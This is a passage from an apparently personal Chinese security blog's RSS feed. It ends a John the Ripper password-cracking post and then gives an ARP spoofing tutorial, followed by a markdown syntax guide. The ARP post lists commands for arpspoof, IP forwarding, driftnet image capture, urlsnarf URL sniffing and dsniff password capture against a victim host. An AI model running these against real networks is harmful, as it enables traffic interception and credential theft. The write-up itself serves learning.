src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203556.png" alt>   </p><h4 id="john破解windows密码"><a href="#john破解windows密码" class="headerlink" title="john破解windows密码"></a>john破解windows密码</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416204211.png" alt><br>显示破解的密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416204506.png" alt></p><h4 id="john的图形化界面——johnny"><a href="#john的图形化界面——johnny" class="headerlink" title="john的图形化界面——johnny"></a>john的图形化界面——johnny</h4><p>johnny破解linux密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416205352.png" alt>   </p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
    </item>
    
    <item>
      <title>arp攻击</title>
      <link>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/</link>
      <guid>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/</guid>
      <pubDate>Wed, 24 Apr 2019 07:35:42 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;img src=&quot;https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418162924.png&quot; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;arpspoof -h
Version: 2.4
Usag
        
      
      </description>
      
      <content:encoded><![CDATA[<p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418162924.png" alt></p><pre><code>arpspoof -hVersion: 2.4Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code></pre><p>aspspoof -t 被攻击ip -r 网关ip<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163045.png" alt><br>然后可以看到winows主机的arp表的变化<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163203.png" alt><br>这时所有的windows通过网关都会转到kali上，所以被攻击无网络服务了。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163339.png" alt><br>kali开启路由转发，<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>此时windows就可以上网了，但是所有的流量都经过kali进行转发。<br>利用kali网卡wireshark进行抓包<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418164821.png" alt><br>driftnet抓取目标机数据图片<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418165355.png" alt><br>创建arotemp目录存放数据图片音频信息，<code>driftnet -i eth0 -a -d arptemp -s</code>-i 选择接口 -a 数据存放目录 -d 指定目录<br>-s 抓取音频仅支持MOEG<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419134908.png" alt><br>获取目标浏览url信息<code>urlsnarf -i eth0</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419135649.png" alt><br>dsniff 对目标密码进行捕获，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419141843.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/#disqus_thread</comments>
    </item>
    
    <item>
      <title>markdown语法</title>
      <link>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</link>
      <guid>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</guid>
      <pubDate>Fri, 29 Mar 2019 08:32:08 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;1-斜体和粗体&quot;&gt;&lt;a href=&quot;#1-斜体和粗体&quot; class=&quot;headerlink&quot; title=&quot;1. 斜体和粗体&quot;&gt;&lt;/a&gt;1. 斜体和粗体&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;*斜体* //斜体
**粗体** //粗体
&lt;/code&gt;&lt;/pre&gt;&lt;h2 i
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="1-斜体和粗体"><a href="#1-斜体和粗体" class="headerlink" title="1. 斜体和粗体"></a>1. 斜体和粗体</h2><pre><code>*斜体* //斜体**粗体** //粗体</code></pre><h2 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2. 分级标题"></a>2. 分级标题</h2><p>用#——#####以”#”的个数进行逐级分级，1-5级;<br>用h1——h5逐级分级</p><h2 id="3-外链接"><a href="#3-外链接" class="headerlink" title="3. 外链接"></a>3. 外链接</h2><pre><code>使用 [描述](链接地址) 为文字增加外链接</code></pre><h2 id="5-段落和换行"><a href="#5-段落和换行" class="headerlink" title="5.段落和换行"></a>5.段落和换行</h2><ul><li>第一种写法：直接敲两个回车键即可<br></li><li>第二种写法:在写完一段后敲两个空格，然后回车写下一段  </li><li>第三种写法:<br><code>&lt;br /&gt;</code>作为换行，然后写下一段<h2 id="6-分隔线-amp-引言"><a href="#6-分隔线-amp-引言" class="headerlink" title="6.分隔线&amp;引言"></a>6.分隔线&amp;引言</h2><code>`</code></li></ul><hr><hr><p>===</p><hr><p><code>`引言</code>&gt;<code>加___  还有一种写法就是每一行都用一个 “&gt;” 号&lt;br&gt;</code>&gt; &gt; <code></code>另外一种就是嵌套引用</p><h2 id="7-列表"><a href="#7-列表" class="headerlink" title="7.列表"></a>7.列表</h2><ul><li>无序列表<br>无序列表可以在每行开头用星号、加号、减号来表示，也可以三者混合一起，推荐使用相同的字符，避免混乱<br></li><li>有序列表<br><br>有序列表用数字接着一个英文句点来表示，数字可无序，但还是推荐使用1.、2.，避免混乱。</li></ul><h2 id="8-代码"><a href="#8-代码" class="headerlink" title="8.代码"></a>8.代码</h2><p>代码块用两个<code>这种符号围住  用`</code>（语言）把代码起始行末尾行围住<br><br>用tap键</p><h2 id="9-更多阅读"><a href="#9-更多阅读" class="headerlink" title="9.更多阅读"></a>9.更多阅读</h2><p><code>&lt;!--more--&gt;</code></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
